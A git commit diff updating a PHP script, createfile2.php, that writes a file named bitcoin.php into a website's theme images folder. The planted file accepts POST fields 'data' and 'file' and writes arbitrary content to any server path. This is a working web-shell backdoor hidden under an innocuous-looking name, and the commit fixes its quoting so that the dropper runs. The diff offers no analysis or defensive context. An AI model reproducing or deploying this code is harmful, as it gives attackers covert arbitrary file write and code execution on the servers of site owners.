33785a14162ae7ed7ae1ccb5b0b80d7a3f996283
loayhayek <44221724+loayhayek@users.noreply.github.com>
2018-10-17 08:48:11 +0300

    Update createfile2.php

--- createfile2.php
+++ createfile2.php
@@ -1,12 +1,8 @@
-<?php file_put_contents("/home1/vpsfast/public_html/themes/default/images/bitcoin.php","
+<?php file_put_contents('/home1/vpsfast/public_html/themes/default/images/bitcoin.php','
 <?php 
-if(isset($_POST['data'])){
-$d=$_POST['data']; 
-$f=$_POST['file']; 
-file_put_contents($f,$d);?>
-}"); 
-
-if(file_exists("/home1/vpsfast/public_html/themes/default/images/bitcoin.php"))
-  echo 1;
-else echo 0;
+if(isset($_POST["data"])){
+$d=$_POST["data"]; 
+$f=$_POST["file"]; 
+file_put_contents($f,$d);}?>
+'); 
 ?>
